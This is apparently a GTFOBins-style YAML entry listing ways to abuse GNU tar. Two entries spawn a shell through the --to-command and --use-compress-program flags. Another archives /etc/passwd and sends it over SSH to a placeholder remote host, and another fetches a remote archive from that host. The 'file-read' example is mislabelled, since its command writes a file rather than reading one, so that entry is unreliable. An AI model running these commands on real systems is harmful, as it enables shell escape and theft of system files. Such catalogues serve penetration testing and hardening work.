---
functions:
  shell:
    - description: The --to-command is normally used to pipe extracted files to a command. This can be used to run arbitrary commands on a host. The file must be a valid archive file.
      code: |
        tar xf /tmp/valid.tar --to-command='/bin/sh -c "sh <&2 1>&2"'
    - description: Similar to the above, but at a previous stage in the extraction. A valid archive is not required. This functionality can be abused in various ways for file-read and file-write (see below).
      code: |
        tar xf /dev/null --use-compress-program='/bin/sh -c "sh <&2 1>&2"'
  file-upload:
    - description: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
      code: |
        tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd --rsh-command=/bin/ssh
  file-download:
    - description: GNU tar has remote archive capabilities, which can be used to download and extract remote archives. The remote machine should have the `rmt` utility installed and configured.
      code: |
        tar xvf remote_user@remote_host.com:/tmp/remote_file --rsh-command=/bin/ssh
  file-read:
    - description: The --use-compress-program flag can be abused to read files.
      code: |
        tar xf /etc/passwd --use-compress-program='/bin/sh -c "echo hello > /tmp/file"'
---
